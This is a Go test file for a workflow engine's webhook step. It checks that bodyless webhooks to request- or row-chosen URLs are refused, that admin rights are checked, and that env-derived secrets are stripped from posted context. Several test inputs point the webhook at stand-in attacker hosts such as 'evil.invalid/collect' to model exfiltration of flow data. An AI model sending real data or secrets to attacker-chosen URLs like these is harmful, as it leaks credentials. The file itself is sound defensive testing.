//go:build !cli

package main

import (
	"encoding/json"
	"net/http/httptest"
	"strings"
	"testing"
)

// `run: webhook` with no body posts the whole flow context (request fields,
// every step's output, env-derived values). That default stays for a URL the
// author fixed, but a request- or row-chosen URL must say what it sends.
// The hosts are unresolvable, so a step that gets past the body check stops
// at the SSRF guard instead of reaching the network.
func TestWebhookEmptyBodyRefusedForRequestChosenURL(t *testing.T) {
	app := secretTaintApp(t)
	run := func(url, body, query string) error {
		t.Helper()
		flow := Flow{Name: "hook", Trigger: FlowTrigger{Type: "http", Method: "GET", Path: "/api/hook"}, Steps: []FlowStep{
			{Name: "secret", Type: "sql", SQL: "SELECT 'internal' AS note"},
			{Type: "webhook", Webhook: url, WebhookBody: body},
			{Type: "respond", Respond: &FlowRespond{Status: 200, Body: "ok"}},
		}}
		return executeFlowHTTP(app, &flow, httptest.NewRecorder(), httptest.NewRequest("GET", "/api/hook"+query, nil))
	}
	for name, c := range map[string]struct{ url, body string }{
		"whole url":          {"{{target}}", ""},
		"path segment":       {"https://hooks.invalid/services/{{target}}", ""},
		"body renders empty": {"{{target}}", "{{ missing | default:'' }}"},
	} {
		err := run(c.url, c.body, "?target=https%3A%2F%2Fevil.invalid%2Fcollect")
		if err == nil || !strings.Contains(err.Error(), "must set `body:`") {
			t.Errorf("%s: want the empty-body refusal, got %v", name, err)
		}
	}
	// A fixed URL keeps the whole-context default, and an explicit body to a
	// request-chosen URL is unchanged: both reach the SSRF guard.
	if err := run("https://hooks.invalid/notify", "", "?target=x"); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
		t.Fatalf("fixed URL with no body: got %v", err)
	}
	if err := run("{{target}}", `{"ok":true}`, "?target=https%3A%2F%2Fevil.invalid%2Fcollect"); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
		t.Fatalf("request URL with a body: got %v", err)
	}

	// A data-event flow's row columns are client-written: a row-chosen URL
	// with no body is refused the same way.
	var got error
	event := Flow{Name: "on-insert", Trigger: FlowTrigger{Type: "on_insert", Table: "hooks"}, Steps: []FlowStep{
		{Type: "webhook", Webhook: "{{hook_url}}"},
	}}
	runFlowEventWith(app, event, map[string]any{"id": 1, "hook_url": "https://evil.invalid/x", "api_token": "t"}, func(ctx *FlowContext) { got = ctx.Error })
	if got == nil || !strings.Contains(got.Error(), "must set `body:`") {
		t.Fatalf("event flow: want the empty-body refusal, got %v", got)
	}
}

// Notify Hub-style service flows let their admin caller name a delivery
// callback and (because `payload:` is not a webhook key) post the whole
// context there. A global admin acting as itself (session or API token)
// keeps that, minus env-derived values; impersonated and act-as admin
// sessions and non-admins are refused.
func TestWebhookEmptyBodyToRequestURLAllowedForDirectAdmin(t *testing.T) {
	app := secretTaintApp(t)
	run := func(s *Session) error {
		t.Helper()
		ctx := &FlowContext{App: app, Session: s, Data: map[string]any{"target": "https://evil.invalid/cb"}, Params: map[string]string{"target": "https://evil.invalid/cb"}, RequestKeys: map[string]bool{"target": true}}
		return executeStep(ctx, &FlowStep{Type: "webhook", Webhook: "{{target}}"})
	}
	for name, s := range map[string]*Session{
		"admin session":      {UserID: 1, Role: "admin"},
		"scoped admin token": {UserID: 1, Role: "admin", CredentialScopes: "flows:call"},
	} {
		if err := run(s); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
			t.Fatalf("%s: want to pass the body check and stop at the SSRF guard, got %v", name, err)
		}
	}
	for name, s := range map[string]*Session{
		"user":         {UserID: 2, Role: "user"},
		"impersonated": {UserID: 1, Role: "admin", ImpersonatorUserID: 9},
		"act-as":       {UserID: 1, Role: "admin", ActingAsGroup: "7"},
		"no session":   nil,
	} {
		if err := run(s); err == nil || !strings.Contains(err.Error(), "must set `body:`") {
			t.Errorf("%s: want the empty-body refusal, got %v", name, err)
		}
	}
	ctx := &FlowContext{Data: map[string]any{"to": "a@b.c", "cfg": map[string]any{"key": "s3cret", "region": "us"}, "tok": "s3cret"},
		SecretKeys: map[string]bool{"tok": true, "cfg.key": true}}
	got := ctx.dataWithoutSecrets()
	if _, ok := got["tok"]; ok {
		t.Fatal("env-derived step output was posted")
	}
	if cfg := got["cfg"].(map[string]any); cfg["key"] != nil || cfg["region"] != "us" || got["to"] != "a@b.c" {
		t.Fatalf("context without secrets = %v", got)
	}
}

// webhookSecretSteps derive values from env (a `run: set` of an env value, a
// SQL step binding one) and read a stored row that holds the env value,
// next to ordinary values.
const webhookSecretSteps = `      - id: creds
        run: set
        with:
          tok: "${{ env.CLIENT_SECRET }}"
          region: us-east
      - id: lookup
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: stored
        run: sql
        with:
          query: SELECT v, 'kept' AS label FROM settings
      - id: note
        run: set
        with:
          plain: hello
`

func webhookSecretApp(t *testing.T) *App {
	t.Helper()
	app := secretTaintApp(t)
	mustExec(t, app.DB, `CREATE TABLE settings (v TEXT)`)
	mustExec(t, app.DB, `INSERT INTO settings (v) VALUES ('key=s3cret-value')`)
	return app
}

// checkWebhookContextWithoutSecrets decodes a whole-context webhook body and
// fails when it carries an env-derived value or lost an ordinary one.
func checkWebhookContextWithoutSecrets(t *testing.T, surface, body string) {
	t.Helper()
	if strings.Contains(body, "s3cret-value") {
		t.Fatalf("%s: the whole-context body carries the env value:\n%s", surface, body)
	}
	var got map[string]any
	if err := json.Unmarshal([]byte(body), &got); err != nil {
		t.Fatalf("%s: body is not JSON: %v\n%s", surface, err, body)
	}
	for _, key := range []string{"tok", "creds.tok", "lookup"} {
		if _, ok := got[key]; ok {
			t.Errorf("%s: env-derived key %q was posted:\n%s", surface, key, body)
		}
	}
	creds, _ := got["creds"].(map[string]any)
	if creds == nil || creds["region"] != "us-east" || got["region"] != "us-east" || got["plain"] != "hello" {
		t.Errorf("%s: ordinary values lost:\n%s", surface, body)
	}
	if !strings.Contains(body, `"label":"kept"`) {
		t.Errorf("%s: the stored row's ordinary column was lost:\n%s", surface, body)
	}
}

// With no body, `run: webhook` posts the whole flow context. Values derived
// from env were left out only when a global admin named the URL; a literal
// URL got them all (round 2026-11-04, hooks finding 5). Every whole-context
// body now leaves out env-derived values and any value holding an env value.
func TestWebhookDefaultBodyOmitsEnvDerivedValues(t *testing.T) {
	app := webhookSecretApp(t)
	steps := webhookSecretSteps + "      - run: webhook\n        with: { url: \"https://8.8.8.8/cb\" }\n"
	_, sent, err := runStepValueFlow(t, app, stepKeyFlow(steps), "?id=7", nil)
	if err != nil || len(sent) != 1 {
		t.Fatalf("literal URL: err %v sent %+v", err, sent)
	}
	checkWebhookContextWithoutSecrets(t, "literal URL", sent[0].body)
	if !strings.Contains(sent[0].body, `"id":"7"`) {
		t.Errorf("literal URL: request field lost:\n%s", sent[0].body)
	}

	// The admin service account naming a delivery callback gets the same
	// context: the URL choice is still allowed, the env values are not sent.
	flow := parseExpectRowsFlow(t, app, stepKeyFlow(webhookSecretSteps+"      - run: webhook\n        with: { url: \"${{ params.callback_url }}\" }\n"))
	callback := func(s *Session) (*FlowContext, []stepValueSent) {
		var sent []stepValueSent
		ctx := &FlowContext{App: app, Session: s,
			Data:        map[string]any{"callback_url": "https://8.8.8.8/cb"},
			Params:      map[string]string{"callback_url": "https://8.8.8.8/cb"},
			RequestKeys: map[string]bool{"callback_url": true},
			Writes:      newFlowWriteLog(),
			apiClient:   stepValueClient(&sent)}
		executeSteps(ctx, flow.Steps[:len(flow.Steps)-1])
		return ctx, sent
	}
	// The URL is request input: a non-admin caller is refused, so the admin
	// run below is the request-chosen-URL branch.
	if ctx, sent := callback(&Session{UserID: 2, Role: "user"}); ctx.Error == nil || !strings.Contains(ctx.Error.Error(), "must set `body:`") || len(sent) != 0 {
		t.Fatalf("non-admin callback: want the empty-body refusal, got %v (sent %+v)", ctx.Error, sent)
	}
	ctx, adminSent := callback(&Session{UserID: 1, Role: "admin"})
	if ctx.Error != nil || len(adminSent) != 1 {
		t.Fatalf("admin callback: err %v sent %+v", ctx.Error, adminSent)
	}
	checkWebhookContextWithoutSecrets(t, "admin callback URL", adminSent[0].body)
}

// An author who means to send a secret names it: a text `body:` or a
// `payload:` is sent as written, env values included.
func TestWebhookExplicitBodyStillSendsNamedSecret(t *testing.T) {
	app := webhookSecretApp(t)
	for name, c := range map[string]struct{ step, want string }{
		"text body": {"      - run: webhook\n        with:\n          url: https://8.8.8.8/cb\n          body: '{\"key\": \"${{ steps.creds.outputs.tok }}\"}'\n", `{"key": "s3cret-value"}`},
		"payload":   {"      - run: webhook\n        with:\n          url: https://8.8.8.8/cb\n          payload: { key: \"${{ env.CLIENT_SECRET }}\", row: \"${{ steps.lookup.outputs.rows.0.secret }}\" }\n", `{"key":"s3cret-value","row":"s3cret-value"}`},
	} {
		_, sent, err := runStepValueFlow(t, app, stepKeyFlow(webhookSecretSteps+c.step), "", nil)
		if err != nil || len(sent) != 1 {
			t.Fatalf("%s: err %v sent %+v", name, err, sent)
		}
		if !jsonEqual(t, sent[0].body, c.want) {
			t.Errorf("%s: body = %s, want %s", name, sent[0].body, c.want)
		}
	}
}
